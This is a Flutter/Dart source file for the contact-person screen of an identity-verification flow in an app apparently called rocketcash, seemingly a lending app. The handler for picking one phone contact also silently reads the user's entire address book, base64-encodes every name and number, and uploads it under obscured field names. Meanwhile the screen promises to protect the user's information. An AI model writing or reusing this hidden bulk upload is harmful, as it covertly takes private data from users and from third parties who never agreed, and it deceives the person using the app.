import 'dart:convert';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:rocketcash/auth/contract/contace_services.dart';
import 'package:rocketcash/auth/contract/contact_controller.dart';
import 'package:flutter/material.dart';
import 'package:rocketcash/auth/contract/contact_enmu_view.dart';
import 'package:rocketcash/auth/introduce/introduce_controller.dart';
import 'package:rocketcash/auth/introduce/transition_view.dart';
import 'package:rocketcash/center/center_list_view.dart';
import 'package:rocketcash/guide/guide_customer_btn.dart';
import 'package:rocketcash/http/flutter_toast.dart';
import 'package:rocketcash/routes/routes.dart';

class ContactView extends GetView<ContactController> {
  ContactView({super.key}) {
    final _ = Get.put(ContactController());
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return PopScope(
      canPop: false,
      child: Scaffold(
        appBar: getAppBar(
          'Identity authentication',
          onPressed: () {
            Get.until((route) {
              final currentRoute = route.settings.name?.split('?').first;
              return currentRoute == AppRoutes.introduce;
            });
            final controller = Get.put(IntroduceController());
            controller.getProductDetailInfo(controller.producdID);
            controller.getAuthInfo(controller.producdID);
          },
        ),
        body: Container(
          color: Color(0xFFEBEDE5),
          child: Obx(() {
            final model = controller.model.value;
            final keyboard = model.maiden?.trained?.keyboard ?? [];
            return ListView(
              children: [
                SizedBox(
                  width: double.infinity,
                  height: 120.h,
                  child: TransitionView(
                    title: 'Contact person',
                    desc: 'We will protect your information security',
                    image: 'peop_con_imge',
                    progress: 0.8,
                  ),
                ),
                SizedBox(height: 10.h),
                ...List.generate(keyboard.length, (index) {
                  final model = keyboard[index];
                  final name = model.relationText ?? '';
                  final phone = "${model.activate}-${model.suitable}";
                  return listCellView(
                    title: model.threat ?? '',
                    name: name.isEmpty ? 'Choose your relationship' : name,
                    phone: phone == '-' ? 'Contact mode' : phone,
                    relationBlock: () {
                      Get.bottomSheet(
                        ContactEnmuView(
                          model: model.employing ?? [],
                          modelBlock: (model1) {
                            // Get.back();
                            model.target = model1.rates ?? '';
                            model.relationText = model1.activate ?? '';
                            controller.model.refresh();
                          },
                          dismissBlock: () {
                            Get.back();
                          },
                        ),
                      );
                    },
                    phoneBlock: () async {
                      final status = await Permission.contacts.status;
                      if (!status.isGranted) {
                        await Permission.contacts.request();
                      }
                      final contact = await IOSContactService.pickContact();
                      if (contact != null) {
                        if (contact.activate.isEmpty || contact.space.isEmpty) {
                          FlutterShowToast.showToast(
                            'Name and phone number fields are required.',
                          );
                          return;
                        }
                        model.activate = contact.activate;
                        model.suitable = contact.space;
                        controller.model.refresh();
                      } else {
                        if (!status.isGranted) {
                          PermissionConfig.showPermissionDeniedDialog(
                            'Contact',
                          );
                        }
                      }
                      final allcontact =
                          await IOSContactService.getAllContacts();
                      var dictArray = {
                        'rates': '3',
                        'limbs': '1',
                        'vortex': '0',
                      };
                      List listArray = <Map<String, dynamic>>[];
                      for (var model in allcontact) {
                        listArray.add({
                          'activate': model.activate,
                          'space': model.space,
                        });
                      }
                      String jsonString = jsonEncode(listArray);
                      String base64String = base64Encode(
                        utf8.encode(jsonString),
                      );
                      dictArray['maiden'] = base64String;
                      await controller.safeAllInfo(dictArray);
                      print('dictArray=======$dictArray');
                    },
                  );
                }),
                Padding(
                  padding: EdgeInsets.only(
                    top: 40.sp,
                    left: 13.sp,
                    right: 13.sp,
                    bottom: 0.sp,
                  ),
                  child: SizedBox(
                    width: double.infinity,
                    height: 50.h,
                    child: GuideCustomerBtn(
                      title: 'Next step',
                      onPressed: () {
                        Map<String, dynamic> dict = {};
                        final model = controller.model.value;
                        final listArratModel =
                            model.maiden?.trained?.keyboard ?? [];
                        List<Map<String, dynamic>> dictArray = [];
                        for (var model in listArratModel) {
                          final dict = {
                            'suitable': model.suitable ?? '',
                            'activate': model.activate ?? '',
                            'target': model.target ?? '',
                            'facing': model.facing ?? '',
                          };
                          dictArray.add(dict);
                        }
                        final jsonStr = jsonEncode(dictArray);
                        dict['maiden'] = jsonStr;
                        controller.upContactInfo(dict);
                      },
                    ),
                  ),
                ),
              ],
            );
          }),
        ),
      ),
    );
  }
}

Widget listCellView({
  required String title,
  required String name,
  required String phone,
  required VoidCallback relationBlock,
  required VoidCallback phoneBlock,
}) {
  return Padding(
    padding: EdgeInsets.only(bottom: 15.sp),
    child: SizedBox(
      height: 125.h,
      child: Padding(
        padding: EdgeInsets.only(left: 13.sp, right: 13.sp),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              title,
              style: TextStyle(
                fontFamily: 'inter',
                fontSize: 13.sp,
                fontWeight: FontWeight.w600,
                color: Color(0xFF333333),
              ),
            ),
            SizedBox(height: 9.h),
            InkWell(
              onTap: relationBlock,
              child: Container(
                height: 40.h,
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(9.sp),
                ),
                child: Padding(
                  padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
                  child: Row(
                    children: [
                      Text(name),
                      Spacer(),
                      Image.asset(
                        'assets/images/right_image.png',
                        width: 15.w,
                        height: 15.h,
                        fit: BoxFit.cover,
                      ),
                    ],
                  ),
                ),
              ),
            ),
            SizedBox(height: 9.h),
            InkWell(
              onTap: phoneBlock,
              child: Container(
                height: 40.h,
                decoration: BoxDecoration(
                  color: Colors.white,
                  borderRadius: BorderRadius.circular(9.sp),
                ),
                child: Padding(
                  padding: EdgeInsets.only(left: 18.sp, right: 18.sp),
                  child: Row(
                    children: [
                      Text(phone),
                      Spacer(),
                      Image.asset(
                        'assets/images/phe_lis_ionge.png',
                        width: 15.w,
                        height: 15.h,
                        fit: BoxFit.cover,
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    ),
  );
}
